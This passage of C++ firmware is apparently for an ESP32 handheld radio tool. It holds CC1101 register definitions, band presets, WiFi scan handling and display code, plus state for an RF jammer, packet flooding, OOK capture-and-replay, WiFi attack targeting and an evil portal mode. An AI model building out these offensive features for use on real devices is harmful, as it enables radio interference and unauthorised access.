constexpr uint8_t CC1101_FSCTRL0  = 0x0C;
constexpr uint8_t CC1101_FREQ2    = 0x0D;
constexpr uint8_t CC1101_FREQ1    = 0x0E;
constexpr uint8_t CC1101_FREQ0    = 0x0F;
constexpr uint8_t CC1101_MDMCFG4  = 0x10;
constexpr uint8_t CC1101_MDMCFG3  = 0x11;
constexpr uint8_t CC1101_MDMCFG2  = 0x12;
constexpr uint8_t CC1101_MDMCFG1  = 0x13;
constexpr uint8_t CC1101_MDMCFG0  = 0x14;
constexpr uint8_t CC1101_DEVIATN  = 0x15;
constexpr uint8_t CC1101_MCSM2    = 0x16;
constexpr uint8_t CC1101_MCSM1    = 0x17;
constexpr uint8_t CC1101_MCSM0    = 0x18;
constexpr uint8_t CC1101_FOCCFG   = 0x19;
constexpr uint8_t CC1101_BSCFG    = 0x1A;
constexpr uint8_t CC1101_AGCCTRL2 = 0x1B;
constexpr uint8_t CC1101_AGCCTRL1 = 0x1C;
constexpr uint8_t CC1101_AGCCTRL0 = 0x1D;
constexpr uint8_t CC1101_FREND1   = 0x21;
constexpr uint8_t CC1101_FREND0   = 0x22;
constexpr uint8_t CC1101_FSCAL3   = 0x23;
constexpr uint8_t CC1101_FSCAL2   = 0x24;
constexpr uint8_t CC1101_FSCAL1   = 0x25;
constexpr uint8_t CC1101_FSCAL0   = 0x26;
constexpr uint8_t CC1101_TEST2    = 0x2C;
constexpr uint8_t CC1101_TEST1    = 0x2D;
constexpr uint8_t CC1101_TEST0    = 0x2E;
constexpr uint8_t CC1101_VERSION  = 0x31;
constexpr uint8_t CC1101_TXBYTES  = 0x3A;  // TX FIFO bytes
constexpr uint8_t CC1101_MARCSTATE = 0x35; // Main radio control state
constexpr uint8_t CC1101_RSSI     = 0x34;

constexpr uint8_t CC1101_SRES     = 0x30;
constexpr uint8_t CC1101_SCAL     = 0x33;
constexpr uint8_t CC1101_SRX      = 0x34;
constexpr uint8_t CC1101_STX      = 0x35;
constexpr uint8_t CC1101_SIDLE    = 0x36;
constexpr uint8_t CC1101_SFRX     = 0x3A;
constexpr uint8_t CC1101_SFTX     = 0x3B;
constexpr uint8_t CC1101_PATABLE  = 0x3E;
constexpr uint8_t CC1101_TXFIFO   = 0x3F;

constexpr uint8_t CC1101_WRITE_BURST = 0x40;
constexpr uint8_t CC1101_READ_SINGLE = 0x80;
constexpr uint8_t CC1101_READ_BURST  = 0xC0;
constexpr uint32_t CC1101_SPI_HZ = 1000000UL;

// Board-specific squelch TX trim, based on SDR verification.
// This app's older async/modulated TX path lands a little differently across
// the UHF ranges we actually use, so keep the trim lightweight and band-aware.
static float getSquelchTxOffsetKHz(float freqMHz) {
    if (freqMHz >= 450.0f && freqMHz < 500.0f) return -28.5f;
    if (freqMHz >= 400.0f) return -18.0f;
    return 0.0f;
}

struct RFBandPreset {
    const char* label;
    float centerMHz;
    float startMHz;
    float endMHz;
    float tuneStepMHz;
};

const RFBandPreset rfBandPresets[] = {
    {"315", 315.00f, 300.00f, 350.00f, 0.05f},   // 315MHz remotes: 300-350MHz
    {"433", 433.92f, 418.00f, 450.00f, 0.05f},   // 433MHz ISM: tighter range, better resolution
    {"868", 868.00f, 860.00f, 876.00f, 0.05f},   // 868MHz EU ISM band
    {"915", 915.00f, 902.00f, 928.00f, 0.10f}    // 915MHz ISM: exact FCC band
};

const int rfBandPresetCount = sizeof(rfBandPresets) / sizeof(rfBandPresets[0]);
const int RF_SWEEP_POINTS = 96;
const int RF_HISTORY_POINTS = 96;
const int RF_CAPTURE_RECORD_POINTS = 212;
const int RF_SWEEP_GRAPH_W = 204;
const int RF_SWEEP_GRAPH_H = 50;
const int RF_SWEEP_WATERFALL_W = 204;
// Slightly below 80px to stay under ESP32 dram0_0_seg BSS limit (linker overflow ~136 B).
const int RF_SWEEP_WATERFALL_H = 69;
const int RF_SWEEP_GRAPH_X = 22;
const int RF_SWEEP_GRAPH_Y = 104;
const int RF_SWEEP_WATERFALL_X = 22;
const int RF_SWEEP_WATERFALL_Y = 176;
const int RF_SWEEP_NOISE_MARGIN = 8;
const int RF_SWEEP_SIGNAL_GAIN = 5;
const int RF_SUB_MAX_PULSES = 832;
const int32_t RF_SUB_PULSE_CHUNK_LIMIT = 30000;
const float CC1101_FREQ_CORRECTION_PPM = 34.0f;

bool cc1101Configured = false;
uint8_t cc1101Version = 0x00;
float cc1101CurrentMHz = 433.92f;
int cc1101PreparedPassiveMode = -1;
float cc1101PreparedPassiveMHz = -1.0f;
unsigned long cc1101LastProbeAttemptMs = 0;
unsigned long cc1101LastReadyMs = 0;

int rfBandIndex = 1;
float rfLockedFrequencyMHz = 433.92f;
bool rfSweepPaused = false;
bool rfScannerFirstDraw = true;
bool rfMonitorFirstDraw = true;
bool rfCaptureFirstDraw = true;
bool rfSweepFirstDraw = true;
bool rfRollingFirstDraw = true;
bool rfRollingSelectPressed = false;
bool rfRollingHoldMode = false;
bool rfSquelchDigitEditActive = false;
bool packetFlooderToggle = false;

// CC1101 Jammer state
bool rfJammerFirstDraw = true;
bool rfJammerConfigured = false;
bool rfJammerSweepMode = true;
bool rfTransmitFirstDraw = true;
bool rfTransmitActive = false;
bool rfTransmitSelectLatched = false;
bool rfSquelchFirstDraw = true;
unsigned long rfLastSampleMs = 0;
unsigned long rfSweepLastStepUs = 0;
unsigned long rfCaptureWindowStart = 0;
unsigned long rfTransmitLastSendMs = 0;
unsigned long rfTransmitLastRearmMs = 0;
int rfCurrentRSSI = -120;
bool rfMonitorMinHoldValid = false;
int rfMonitorMinHoldDbm = -120;
int rfPeakRSSI = -120;
int rfAverageRSSI = -120;
float rfDisplayRSSI = -120.0f;
float rfDisplayPeak = -120.0f;
float rfDisplayAverage = -120.0f;
float rfSweepStrongestMHz = 433.92f;
int rfSweepStrongestRSSI = -120;
int rfSweepCursor = 0;
uint8_t rfSweepLevels[RF_SWEEP_POINTS] = {0};
uint8_t rfSweepPeakHold[RF_SWEEP_POINTS] = {0};
uint8_t rfSweepNoiseFloor[RF_SWEEP_POINTS] = {0};
uint8_t rfSweepWarmupPasses = 0;
int rfMonitorHistory[RF_HISTORY_POINTS] = {0};
int rfMonitorHistoryIndex = 0;
int rfMonitorHistoryCount = 0;
int rfCaptureHistory[RF_HISTORY_POINTS] = {0};
int rfCaptureHistoryIndex = 0;
int rfCaptureHistoryCount = 0;
int rfCaptureHits = 0;
int rfCapturePeakHits = 0;
int rfCaptureThreshold = -75;  // raised from -82: max-gain AGC makes noise floor higher
int rfMonitorGraphColumn = 0;
int rfMonitorPrevY = -1;
int rfCaptureGraphColumn = 0;
int rfSweepWaterfallColumn = 0;
bool rfCaptureRecording = false;
bool rfCaptureHasRecording = false;
int rfCaptureRecordedHistory[RF_CAPTURE_RECORD_POINTS] = {0};
int rfCaptureRecordedCount = 0;
unsigned long rfCaptureRecordingStartMs = 0;
uint16_t rfSweepWaterfallBuffer[RF_SWEEP_WATERFALL_W * RF_SWEEP_WATERFALL_H] = {0};
uint16_t rfSweepSpectrumBuffer[RF_SWEEP_GRAPH_W * RF_SWEEP_GRAPH_H] = {0};
uint32_t rfTransmitCount = 0;
uint8_t rfTransmitSequence = 0;
String rfCaptureStatus = "";
unsigned long rfCaptureStatusUntil = 0;
bool rfSubLoaded = false;
String rfSubLoadedPath = "";
String rfSubLoadedName = "";
String rfSubPreset = "FuriHalSubGhzPresetOok650Async";
String rfTransmitStatus = "";
unsigned long rfTransmitStatusUntil = 0;
uint32_t rfSubFrequencyHz = 433920000UL;
int16_t rfSubTimingStorage[RF_SUB_MAX_PULSES] = {0};  // static fallback
int16_t* rfSubTimings = rfSubTimingStorage;            // points to static or dynamic buffer
int16_t* rfSubDynamicBuf = nullptr;                    // dynamic buffer if allocated
int rfSubPulseCount = 0;
String rfStatCacheLeft[2];
String rfStatCacheRight[2];
int rfStatCacheMode[2] = {-1, -1};
String rfFooterCache[3];
int rfFooterCacheMode[3] = {-1, -1, -1};

// ===== RF REPLAY STATE =====
// Lightweight direct OOK pulse capture + replay via CC1101 + GDO0.
// We intentionally avoid RCSwitch here because the project is already tight on DRAM.
bool rfReplayListening = false;
bool rfReplayHasCapture = false;
unsigned long rfReplayCapturedValue = 0;
int rfReplayCapturedBits = 0;
bool rfReplayFirstDraw = true;
String rfReplayStatus = "";
unsigned long rfReplayStatusUntil = 0;
// Raw pulse storage for replay (up to 128 pulse pairs = 256 timings).
static uint16_t* rfReplayRawTimings = nullptr;
static int rfReplayRawCount = 0;

static bool rfReplayEnsureBuf() {
    if (rfReplayRawTimings) return true;
    rfReplayRawTimings = (uint16_t*)heap_caps_malloc(256 * sizeof(uint16_t), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!rfReplayRawTimings)
        rfReplayRawTimings = (uint16_t*)malloc(256 * sizeof(uint16_t));
    return rfReplayRawTimings != nullptr;
}

static void resetRFReplayCaptureState() {
    rfReplayHasCapture = false;
    rfReplayCapturedValue = 0;
    rfReplayCapturedBits = 0;
    rfReplayRawCount = 0;
}

// ===== RADIO 1 (NRF24) =====
#define NRF24_RADIO1_CE  17
#define NRF24_RADIO1_CSN 16
#define NRF24_RADIO2_CE  14
#define NRF24_RADIO2_CSN 20
#define NRF24_RADIO3_CE  21
#define NRF24_RADIO3_CSN 9

RF24 radio1(NRF24_RADIO1_CE, NRF24_RADIO1_CSN);
RF24 radio2(NRF24_RADIO2_CE, NRF24_RADIO2_CSN, 1000000);  // CC1101 handling (unused NRF24 object)
RF24 radio3(NRF24_RADIO3_CE, NRF24_RADIO3_CSN, 1000000);  // Second NRF24 for dual jamming

// ===== 2.4GHz SCANNER =====
#define CHANNEL_COUNT 126

uint8_t channelActivity[CHANNEL_COUNT];

int scanChannel = 0;

int wifiChannel[20];
int wifiEncryption[20];

const int SCANNER_SPECTRUM_Y = 38;
const int SCANNER_SPECTRUM_HEIGHT = 72;
const int SCANNER_WATERFALL_START_Y = 116;
const int SCANNER_WATERFALL_END_Y = 309;
const int GHZ_PANEL_X = 6;
const int GHZ_PANEL_Y = 24;
const int GHZ_PANEL_W = 228;
const int GHZ_PANEL_H = 292;
const int GHZ_INNER_X0 = 6;
const int GHZ_INNER_X1 = 233;
const int GHZ_INNER_W = GHZ_INNER_X1 - GHZ_INNER_X0 + 1;

float channelPower[14] = {0};
float smoothedPower[14] = {0};
int8_t sigMonRssi[14] = {0};

int lastSelectedChannel = -1;

bool isPressed(int pin);

bool beaconInitialized = false;

unsigned long lastScanAnim = 0;
uint8_t scanDots = 1;


RadioMode currentRadioMode = RADIO_IDLE;
bool isBLEMode(RadioMode mode);
bool isWiFiMode(RadioMode mode);
void stopCurrentRadioMode(bool clearMode);
void enterMode(RadioMode mode);

uint8_t selectedStrength = 0;
bool ghzScannerFirstDraw = true;
bool radio24ActiveFirstDraw = true;
int ghzScannerLastHighlight = -1;
int ghzScannerLastInfoChannel = -1;
int ghzScannerLastInfoStrength = -1;
int ghzScannerLastInfoAverage = -1;
int ghzScannerLastInfoPeak = -1;
int ghzNoiseLastInfoChannel = -1;
int ghzNoiseLastInfoPercent = -1;
int ghzNoiseLastInfoPeak = -1;
float ghzScannerDisplayAverage = -1.0f;
float ghzScannerDisplayPeak = -1.0f;
float ghzNoiseDisplayAverage = -1.0f;
float ghzNoiseDisplayPeak = -1.0f;
bool ghzWaterfallNeedsReset = true;

void run24GHzScannerStep();

int8_t wifiSelectedIndex = 0;
int8_t wifiScrollOffset = 0;
bool wifiNeedsRedraw = true;

bool isPinnedIconPath(const String& path) {
    return path == "/icons/sd.bin" ||
           path == "/icons/wifi.bin" ||
           path == "/icons/bluetooth.bin" ||
           path == "/icons/ghz24.bin" ||
           path == "/icons/rf.bin" ||
           path == "/icons/settings.bin" ||
           path == "/icons/back.bin" ||
           path == "/icons/system.bin";
}

static int countPinnedIconsInCache() {
    int pinned = 0;
    for (int i = 0; i < iconCacheCount; i++) {
        if (iconCache[i].pinned) {
            pinned++;
        }
    }
    return pinned;
}

// Attack target selection (max 5 targets to handle same SSID on multiple channels)
int attackTargetCount = 0;
char attackTargetSSIDs[5][16];
uint8_t attackTargetBSSIDs[5][6]; // Store as binary instead of string
int attackTargetChannels[5];
bool selectingAttackTargets = false;
bool noiseFirstDraw = true;
float noiseLevel[CHANNEL_COUNT] = {0};

void shutdownWiFiStack(bool clearResults) {
    wifiScanRunning = false;
    wifiScanReadyAt = 0;
    wifiScanKeepStatusUntil = 0;
    wifiScanAutoRetryPending = false;
    wifiScanWarmupRetries = 0;
    wifiInitRetryAt = 0;

    wifi_mode_t currentMode = WIFI_MODE_NULL;
    if (esp_wifi_get_mode(&currentMode) != ESP_OK) {
        currentMode = WIFI_MODE_NULL;
    }

    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    esp_wifi_scan_stop();

    if (currentMode != WIFI_MODE_NULL) {
        esp_wifi_stop();
        delay(30);
    }

    WiFi.mode(WIFI_OFF);
    WiFi.scanDelete();
    delay(50);

    if (clearResults) {
        clearWiFiScanResults();
    }
}

void resetWiFi() {
    wifiScanRunning = false;
    wifiScanReadyAt = 0;
    wifiScanKeepStatusUntil = 0;
    wifiScanAutoRetryPending = false;
    wifiScanWarmupRetries = 0;
    wifiInitRetryAt = 0;

    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    esp_wifi_scan_stop();
    WiFi.scanDelete();
    
    // Ensure WiFi is in STA mode for next operation
    WiFi.mode(WIFI_STA);
    delay(10);
    
    // Keep normal WiFi mode exits light. Full WiFi shutdown is reserved for
    // BLE handoff via shutdownWiFiStack(), which avoids repeated driver
    // uninit timeouts when simply backing out of WiFi tools.
    clearWiFiScanResults();
}

void releaseTransientIconHeapForMode(const char* modeLabel) {
    releaseIconCacheMemory();
    LOG_IF(DEBUG_VERBOSE_ICONS, String("Heap after icon release for ") + modeLabel + ": " + String(ESP.getFreeHeap()));
}

ToolGuardState* getToolGuardState(RadioMode mode) {
    for (size_t i = 0; i < sizeof(g_toolGuards) / sizeof(g_toolGuards[0]); i++) {
        if (g_toolGuards[i].mode == mode) {
            return &g_toolGuards[i];
        }
    }
    for (size_t i = 0; i < sizeof(g_toolGuards) / sizeof(g_toolGuards[0]); i++) {
        if (g_toolGuards[i].mode == RADIO_IDLE) {
            g_toolGuards[i].mode = mode;
            g_toolGuards[i].failCount = 0;
            g_toolGuards[i].blockedUntil = 0;
            g_toolGuards[i].reason[0] = 0;
            return &g_toolGuards[i];
        }
    }
    return nullptr;
}

void markToolInitFailure(RadioMode mode, const char* reason, unsigned long blockMs) {
    // BUG FIX 1.48: Add watchdog reset to prevent system hang on errors
    esp_task_wdt_reset();
    
    ToolGuardState* state = getToolGuardState(mode);
    if (!state) {
        return;
    }
    if (state->failCount < 255) {
        state->failCount++;
    }
    state->blockedUntil = millis() + blockMs;
    if (reason && reason[0]) {
        strncpy(state->reason, reason, sizeof(state->reason) - 1);
        state->reason[sizeof(state->reason) - 1] = 0;
    } else {
        strcpy(state->reason, "Init failed");
    }
    prefs.putUChar("safeTool", (uint8_t)mode);
    prefs.putUChar("safeFails", state->failCount);
    prefs.putString("safeWhy", String(state->reason));
    
    // BUG FIX 1.48: Attempt to recover from error state
    // Clean up radio state to prevent cascading failures
    stopCurrentRadioMode(true);
    releaseIconCacheMemory();
}

void clearToolGuardFailure(RadioMode mode) {
    ToolGuardState* state = getToolGuardState(mode);
    if (!state) {
        return;
    }
    state->failCount = 0;
    state->blockedUntil = 0;
    state->reason[0] = 0;
    if (prefs.getUChar("safeTool", 0) == (uint8_t)mode) {
        prefs.putUChar("safeFails", 0);
        prefs.putString("safeWhy", "");
    }
}

bool toolNeedsHighHeap(RadioMode mode) {
    return mode == BLE_SCAN ||
           mode == BLE_RADAR ||
           mode == BLE_SIGNAL_LOGGER ||
           mode == BLE_SIGNAL_LOGGER_PICK ||
           mode == RF_FREQUENCY_SWEEP ||
           mode == RF_MONITOR ||
           mode == RF_SIGNAL_CAPTURE ||
           mode == WIFI_ATTACK_EVIL_PORTAL;
}

bool canEnterToolMode(RadioMode mode, const char** reasonOut) {
    if (reasonOut) {
        *reasonOut = nullptr;
    }

    ToolGuardState* state = getToolGuardState(mode);
    if (state && state->blockedUntil != 0 && millis() < state->blockedUntil) {
        if (reasonOut) {
            *reasonOut = state->reason[0] ? state->reason : "Cooling down";
        }
        return false;
    }

    uint8_t persistedFails = 0;
    if (prefs.getUChar("safeTool", 0) == (uint8_t)mode) {
        persistedFails = prefs.getUChar("safeFails", 0);
    }
    if (persistedFails >= 2) {
        if (reasonOut) {
            *reasonOut = "Safe mode";
        }
        return false;
    }

    if (toolNeedsHighHeap(mode)) {
        const uint32_t freeHeap = ESP.getFreeHeap();
        const size_t largestBlock = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
        const bool veryHeavyTool = (mode == RF_FREQUENCY_SWEEP || mode == BLE_SCAN || mode == WIFI_ATTACK_EVIL_PORTAL);
        const uint32_t heapFloor = veryHeavyTool ? 82000UL : 70000UL;
        const size_t blockFloor = veryHeavyTool ? 42000UL : 32000UL;
        if (freeHeap < heapFloor || largestBlock < blockFloor) {
            if (reasonOut) {
                *reasonOut = "Low memory";
            }
            return false;
        }
    }

    if (mode == RF_FREQUENCY_SWEEP && !cc1101Ok) {
        if (reasonOut) {
            *reasonOut = "CC1101 offline";
        }
        return false;
    }

    return true;
}

void drawToolBlockedScreen(const char* title, const char* reason, const char* detail) {
    tft.fillScreen(ILI9341_BLACK);
    drawStatusBar();
    tft.setTextSize(2);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(18, 40);
    tft.print(title ? title : "Tool");

    tft.setTextSize(1);
    tft.setTextColor(tft.color565(160, 160, 160));
    tft.setCursor(18, 58);
    tft.print("Tool health guard");

    tft.fillRoundRect(14, 86, 212, 76, 6, tft.color565(18, 18, 18));
    tft.drawRoundRect(14, 86, 212, 76, 6, tft.color565(52, 52, 52));
    tft.setTextColor(ILI9341_RED);
    tft.setCursor(24, 104);
    tft.print(reason ? reason : "Unavailable");

    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(24, 122);
    tft.print("Free heap: ");
    tft.print(ESP.getFreeHeap());
    tft.setCursor(24, 136);
    tft.print("Largest block: ");
    tft.print((uint32_t)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));

    if (detail && detail[0]) {
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(24, 152);
        tft.print(detail);
    }

    tft.setTextColor(tft.color565(160, 160, 160));
    tft.setCursor(58, 292);
    tft.print("LEFT back  Try again soon");
}

uint8_t getToolBlockedReasonCode(const char* reason) {
    if (!reason || !reason[0]) return 0;
    if (strcmp(reason, "Low memory") == 0) return 1;
    if (strcmp(reason, "CC1101 offline") == 0) return 2;
    if (strcmp(reason, "Safe mode") == 0) return 3;
    if (strcmp(reason, "Cooling down") == 0) return 4;
    return 5;
}

const char* getToolBlockedReasonText(uint8_t code) {
    switch (code) {
        case 1: return "Low memory";
        case 2: return "CC1101 offline";
        case 3: return "Safe mode";
        case 4: return "Cooling down";
        case 5: return "Tool blocked";
        default: return "Unavailable";
    }
}

void setToolBlockedState(RadioMode mode, const char* reason) {
    toolBlockedScreenActive = true;
    toolBlockedMode = (uint8_t)mode;
    toolBlockedReasonCode = getToolBlockedReasonCode(reason);
}

void clearToolBlockedState() {
    toolBlockedScreenActive = false;
    toolBlockedMode = 0;
    toolBlockedReasonCode = 0;
}

void drawListSelectionFrame(int x, int y, int w, int h, bool selected, uint16_t accent) {
    uint16_t normalBorder = tft.color565(44, 44, 44);
    if (!selected) {
        tft.drawRoundRect(x, y, w, h, 4, normalBorder);
        return;
    }

    tft.drawRoundRect(x, y, w, h, 4, ILI9341_WHITE);
    tft.drawRoundRect(x + 1, y + 1, w - 2, h - 2, 4, accent);
    tft.fillRect(x + 2, y + 2, 4, h - 4, accent);
}

void logHeapTelemetry(const char* scope) {
    const unsigned long now = millis();
    if (now - lastHeapTelemetryLogMs < 15000UL) {
        return;
    }
    lastHeapTelemetryLogMs = now;
    LOG(String("Heap telemetry ") + (scope ? scope : "") +
        " free=" + String(ESP.getFreeHeap()) +
        " largest=" + String((uint32_t)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT)) +
        " icons=" + String(iconCacheCount));
}

bool shouldRunBLEScanInline() {
    size_t largestBlock = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
    uint32_t freeHeap = ESP.getFreeHeap();

    // NimBLE needs ~60KB contiguous. Run inline when heap is tight.
    if (freeHeap < 90000UL || largestBlock < 55000UL) {
        LOG(String("BLE scan inline fallback heap=") + String(freeHeap) +
            " largest=" + String((uint32_t)largestBlock));
        return true;
    }

    return false;
}

void setBLEScanStatus(const char* status, bool failed = false) {
    if (!status || status[0] == 0) {
        status = "Idle";
    }
    strncpy(bleScanStatus, status, sizeof(bleScanStatus) - 1);
    bleScanStatus[sizeof(bleScanStatus) - 1] = 0;
    bleScanLastRunFailed = failed;
}

void setWiFiScanStatus(const char* status, bool failed = false) {
    if (!status || status[0] == 0) {
        status = "Idle";
    }
    strncpy(wifiScanStatus, status, sizeof(wifiScanStatus) - 1);
    wifiScanStatus[sizeof(wifiScanStatus) - 1] = 0;
    wifiScanLastRunFailed = failed;
}

void setWiFiScanDebug(const String& ssid, const String& bssid, int channel, int rssi) {
    const char* shown = ssid.length() ? ssid.c_str() : "(hidden)";
    char shortBssid[9];
    formatWiFiListBSSID(bssid.c_str(), shortBssid, sizeof(shortBssid));

    char trimmed[19];
    strncpy(trimmed, shown, sizeof(trimmed) - 1);
    trimmed[sizeof(trimmed) - 1] = 0;

    snprintf(wifiScanDebugLine, sizeof(wifiScanDebugLine), "%s %s C%d %d",
             trimmed, shortBssid, channel, rssi);
    wifiScanDebugLine[sizeof(wifiScanDebugLine) - 1] = 0;
}

static int countWiFiEntriesForSSID(const String& ssid, int count) {
    int matches = 0;
    for (int i = 0; i < count; i++) {
        if (strcmp(wifiSSIDs[i], ssid.c_str()) == 0) {
            matches++;
        }
    }
    return matches;
}

static int chooseWiFiDiversityReplacementIndex(const String& incomingSSID, int count) {
    if (incomingSSID.length() == 0) {
        return -1;
    }

    if (countWiFiEntriesForSSID(incomingSSID, count) > 0) {
        return -1;
    }

    int bestIndex = -1;
    int bestDupCount = 1;
    int weakestRssi = 127;

    for (int i = 0; i < count; i++) {
        String currentSSID = wifiSSIDs[i];
        int dupCount = countWiFiEntriesForSSID(currentSSID, count);
        if (dupCount <= 1) {
            continue;
        }

        if (bestIndex < 0 ||
            dupCount > bestDupCount ||
            (dupCount == bestDupCount && wifiRSSI[i] < weakestRssi)) {
            bestIndex = i;
            bestDupCount = dupCount;
            weakestRssi = wifiRSSI[i];
        }
    }

    return bestIndex;
}

void storeWiFiNetworkResult(const String& ssid, const String& bssid, int channel, int rssi, const String& enc, int& count) {
    if (bssid.length() == 0) return;

    String resolvedName = ssid;
    if (resolvedName.length() == 0) resolvedName = "(hidden)";
    String infraHint = classifyWiFiInfrastructure(resolvedName, bssid);

    // Deduplicate by SSID — multiple APs with same SSID = one entry, best RSSI
    // Exception: hidden networks deduplicate by BSSID
    // Deduplicate by BSSID so same-name APs remain distinct in the scanner.
    bool isHidden = (ssid.length() == 0);
    for (int i = 0; i < count; i++) {
        if (strcmp(wifiBSSID[i], bssid.c_str()) != 0) continue;

        if (!isHidden) {
            bool existingHidden = strcmp(wifiSSIDs[i], "(hidden)") == 0;
            bool existingDifferent = strcmp(wifiSSIDs[i], resolvedName.c_str()) != 0;
            size_t existingLen = strlen(wifiSSIDs[i]);
            bool existingLooksTruncated = existingLen > 0 &&
                                          strncmp(wifiSSIDs[i], resolvedName.c_str(), existingLen) == 0 &&
                                          resolvedName.length() > existingLen;
            if (existingHidden || existingLooksTruncated || (existingDifferent && resolvedName.length() > existingLen)) {
                strncpy(wifiSSIDs[i], resolvedName.c_str(), 32);
                wifiSSIDs[i][32] = 0;
            }
        }

        // Keep strongest signal, update channel to match.
        if (rssi > wifiRSSI[i]) {
            wifiRSSI[i] = rssi;
            wifiChannel[i] = channel;
        }

        if (enc.length() > 0) {
            strncpy(wifiEncStr[i], enc.c_str(), 7);
            wifiEncStr[i][7] = 0;
        }

        if (infraHint.length() > 0) {
            strncpy(wifiHints[i], infraHint.c_str(), 15); wifiHints[i][15] = 0;
        }
        wifiLastSeen[i] = millis();
        return;
    }

    if (orionToolsWifiOpenOnly() && enc != "OPEN") {
        return;
    }

    if (count >= MAX_SCAN_RESULTS) {
        int replacementIndex = chooseWiFiDiversityReplacementIndex(resolvedName, count);
        if (replacementIndex < 0) {
            return;
        }

        strncpy(wifiSSIDs[replacementIndex], resolvedName.c_str(), 32); wifiSSIDs[replacementIndex][32] = 0;
        wifiRSSI[replacementIndex] = rssi;
        wifiChannel[replacementIndex] = channel;
        strncpy(wifiBSSID[replacementIndex], bssid.c_str(), 17); wifiBSSID[replacementIndex][17] = 0;
        strncpy(wifiEncStr[replacementIndex], enc.c_str(), 7); wifiEncStr[replacementIndex][7] = 0;
        if (infraHint.length() > 0) {
            strncpy(wifiHints[replacementIndex], infraHint.c_str(), 15); wifiHints[replacementIndex][15] = 0;
        } else {
            wifiHints[replacementIndex][0] = 0;
        }
        wifiLastSeen[replacementIndex] = millis();
        return;
    }

    strncpy(wifiSSIDs[count], resolvedName.c_str(), 32); wifiSSIDs[count][32] = 0;
    wifiRSSI[count] = rssi;
    wifiChannel[count] = channel;
    strncpy(wifiBSSID[count], bssid.c_str(), 17); wifiBSSID[count][17] = 0;
    strncpy(wifiEncStr[count], enc.c_str(), 7); wifiEncStr[count][7] = 0;
    if (infraHint.length() > 0) {
        strncpy(wifiHints[count], infraHint.c_str(), 15); wifiHints[count][15] = 0;
    } else {
        wifiHints[count][0] = 0;
    }
    wifiLastSeen[count] = millis();
    count++;
}

static void formatWiFiListBSSID(const char* bssid, char* out, size_t outSize) {
    if (!out || outSize == 0) return;
    out[0] = 0;
    if (!bssid || bssid[0] == 0) return;

    size_t len = strlen(bssid);
    const char* tail = bssid;
    if (len > 8) {
        tail = bssid + (len - 8);
    }

    snprintf(out, outSize, "%s", tail);
}

static void formatWiFiListSSID(const char* ssid, char* out, size_t outSize) {
    if (!out || outSize == 0) return;
    out[0] = 0;

    if (!ssid || ssid[0] == 0) {
        strncpy(out, "(hidden)", outSize - 1);
        out[outSize - 1] = 0;
        return;
    }

    const size_t len = strlen(ssid);
    if (len < outSize) {
        strncpy(out, ssid, outSize - 1);
        out[outSize - 1] = 0;
        return;
    }

    if (outSize < 8) {
        strncpy(out, ssid, outSize - 1);
        out[outSize - 1] = 0;
        return;
    }

    const size_t visible = outSize - 1;
    const size_t prefixLen = visible / 2;
    const size_t suffixLen = visible - prefixLen - 1;

    strncpy(out, ssid, prefixLen);
    out[prefixLen] = '~';
    strncpy(out + prefixLen + 1, ssid + len - suffixLen, suffixLen);
    out[visible] = 0;
}

void sortWiFiResultsByRSSI() {
    for (int i = 0; i < wifiNetworkCount - 1; i++) {
        for (int j = i + 1; j < wifiNetworkCount; j++) {
            if (wifiRSSI[j] <= wifiRSSI[i]) continue;
            // swap char arrays manually
            char tmp[33];
            strncpy(tmp, wifiSSIDs[i], 33); strncpy(wifiSSIDs[i], wifiSSIDs[j], 33); strncpy(wifiSSIDs[j], tmp, 33);
            strncpy(tmp, wifiBSSID[i], 18); strncpy(wifiBSSID[i], wifiBSSID[j], 18); strncpy(wifiBSSID[j], tmp, 18);
            strncpy(tmp, wifiEncStr[i], 8);  strncpy(wifiEncStr[i], wifiEncStr[j], 8);  strncpy(wifiEncStr[j], tmp, 8);
            char hintTmp[16];
            strncpy(hintTmp, wifiHints[i], sizeof(hintTmp));
            strncpy(wifiHints[i], wifiHints[j], sizeof(wifiHints[i]));
            strncpy(wifiHints[j], hintTmp, sizeof(wifiHints[j]));
            std::swap(wifiRSSI[i], wifiRSSI[j]);
            std::swap(wifiChannel[i], wifiChannel[j]);
            std::swap(wifiLastSeen[i], wifiLastSeen[j]);
        }
        yield();
    }
}

void captureWiFiDetailSnapshot(int index) {
    if (index < 0 || index >= wifiNetworkCount) {
        wifiDetailSnapshotValid = false;
        wifiDetailSnapshotSSID[0] = 0;
        wifiDetailSnapshotBSSID[0] = 0;
        wifiDetailSnapshotEnc[0] = 0;
        wifiDetailSnapshotHint[0] = 0;
        wifiDetailSnapshotRSSI = -100;
        wifiDetailSnapshotChannel = 0;
        return;
    }

    strncpy(wifiDetailSnapshotSSID, wifiSSIDs[index], sizeof(wifiDetailSnapshotSSID) - 1);
    wifiDetailSnapshotSSID[sizeof(wifiDetailSnapshotSSID) - 1] = 0;
    strncpy(wifiDetailSnapshotBSSID, wifiBSSID[index], sizeof(wifiDetailSnapshotBSSID) - 1);
    wifiDetailSnapshotBSSID[sizeof(wifiDetailSnapshotBSSID) - 1] = 0;
    strncpy(wifiDetailSnapshotEnc, wifiEncStr[index], sizeof(wifiDetailSnapshotEnc) - 1);
    wifiDetailSnapshotEnc[sizeof(wifiDetailSnapshotEnc) - 1] = 0;
    strncpy(wifiDetailSnapshotHint, wifiHints[index], sizeof(wifiDetailSnapshotHint) - 1);
    wifiDetailSnapshotHint[sizeof(wifiDetailSnapshotHint) - 1] = 0;
    wifiDetailSnapshotRSSI = wifiRSSI[index];
    wifiDetailSnapshotChannel = wifiChannel[index];
    wifiDetailSnapshotValid = true;
}

void drawWiFiDetail() {
    tft.fillScreen(ILI9341_BLACK);
    drawStatusBar();

    if (!wifiDetailSnapshotValid) {
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 80);
        tft.print("No network data");
        tft.setCursor(18, 96);
        tft.print("LEFT to go back");
        return;
    }

    // Header
